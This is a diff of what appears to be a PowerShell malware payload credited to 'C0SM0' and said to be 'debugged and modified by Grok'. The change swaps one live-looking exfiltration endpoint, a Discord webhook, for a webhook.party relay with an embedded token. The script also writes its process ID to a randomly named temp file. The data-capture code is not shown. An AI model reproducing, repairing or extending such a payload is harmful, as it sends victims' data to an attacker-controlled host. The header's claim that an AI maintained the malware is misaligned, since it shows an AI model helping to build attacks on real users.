@@ -2,7 +2,7 @@
 # created by: C0SM0, debugged and modified by Grok
 
 # webhook, CHANGE ME (ensure this is a valid, active Discord webhook URL)
-$webhook = "https://discord.com/api/webhooks/1380976425208778935/BYngRi6W-bJS40mQiRLo6enK1A4YajR8qR0jExZTA4zuPr6i7c4G4SYUCSpPxzhllBke"
+$webhook = "https://l.webhook.party/hook/7MdtfvXi%2BEqT4d5IsPww1nuLRdGQTUVm4P9Tw926qpNQfk780GgM2WOHSVzfMeGmqIn0%2F5dxz4UnyPp6q6UQxShPeI%2BJet9RIUJqfnhJ6CWwnOZtw8%2FfG3LSF%2Ft2fBL0w48QWBShx%2B0e%2B%2F5LIrnhFEN1ztwERAjR7HmLjbLP2JOdBRqdQwKsN2%2FfwBYI0OqvV06xr9h%2BIfIMAk4ny%2FeLCal0e8iwmMkeLhe2Zjo5fS69bxO2%2FWObLXiqW9BR%2Fz5191wIL42cMbR6zvbBPvSr2f%2F2D9PiWtOeCLbQypagOSSKBEhV4oUJZ7aQgsE%2BLA2A%2FuDXkxqFixcVdPJISoa7gjUfI8Pl1fYj2eYr48ItMC4E7CfT2TiQ6epaAUwFrx64U02CNV82U5g%3D/%2FySCA3%2FUahbpWYdL"
 
 # write pid
 $PID | Out-File "$env:TEMP\DdBPKCytRe"
